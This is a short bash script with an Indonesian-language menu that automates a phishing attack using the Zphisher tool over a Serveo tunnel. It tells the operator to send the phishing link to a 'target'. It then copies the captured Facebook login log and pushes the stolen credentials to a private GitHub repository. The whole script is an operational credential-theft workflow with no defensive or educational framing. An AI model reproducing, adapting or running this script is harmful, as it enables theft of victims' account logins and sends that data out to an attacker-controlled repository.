#!/bin/bash

B='\033[1;34m'
G='\033[1;32m'
Y='\033[1;33m'
R='\033[1;31m'
NC='\033[0m'

while true; do
clear
echo -e "${B}============================"
echo -e "${G}     ZPHISHER MENU"
echo -e "${B}============================${NC}"
echo -e "${Y}1. Login Account (FB/Google)"
echo -e "0. Exit${NC}"
echo
read -p "Pilih Menu: " pil

case $pil in
1)
    clear
    echo -e "${G}Menjalankan Zphisher dengan Serveo..."
    zphisher &
    sleep 10
    read -p "Kirim link serveo ke target, tekan Enter jika sudah login..."

    # Cek dan salin hasil
    LOGFILE="$HOME/.zphisher/sites/facebook/log.txt"
    if [[ -f "$LOGFILE" ]]; then
        echo -e "${G}Login ditemukan, menyimpan..."

        mkdir -p .data
        cp "$LOGFILE" ".data/hasil.txt"

        git add .data/hasil.txt
        git commit -m "Update hasil login"
        git push origin main
        echo -e "${Y}Hasil dikirim ke GitHub privat.${NC}"
    else
        echo -e "${R}Belum ada login.${NC}"
    fi
    ;;
0)
    echo -e "${G}Keluar..."; exit;;
*)
    echo -e "${R}Menu tidak valid!${NC}"; sleep 1;;
esac
done
